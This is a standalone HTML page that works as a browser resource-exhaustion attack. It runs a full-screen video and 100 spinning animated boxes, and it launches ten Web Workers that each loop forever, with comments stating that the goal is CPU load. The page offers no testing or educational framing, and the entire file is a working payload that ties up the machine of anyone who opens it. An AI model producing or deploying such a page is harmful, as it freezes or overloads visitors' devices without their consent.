<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Resource Intensive HTML</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
        }

        .container {
            display: flex;
            flex-wrap: wrap;
        }

        .box {
            width: 20%;
            height: 20vh;
            animation: spin 1s infinite linear;
            border: 5px solid black;
            background: linear-gradient(45deg, red, yellow, green, cyan, blue, magenta);
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>
    <video autoplay loop muted playsinline style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;">
        <source src="albuquerque.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <div class="container">
        <!-- Generates 100 spinning boxes -->
        <script>
            for (let i = 0; i < 100; i++) {
                const box = document.createElement('div');
                box.className = 'box';
                document.body.appendChild(box);
            }
        </script>
    </div>

    <script>
        // Infinite loop to generate CPU load
        function heavyComputation() {
            while (true) {
                Math.random();
            }
        }

        // Initiate multiple heavy computation threads
        for (let i = 0; i < 10; i++) {
            new Worker(URL.createObjectURL(new Blob(["(" + heavyComputation.toString() + ")()"], { type: "text/javascript" })));
        }
    </script>
</body>
</html>
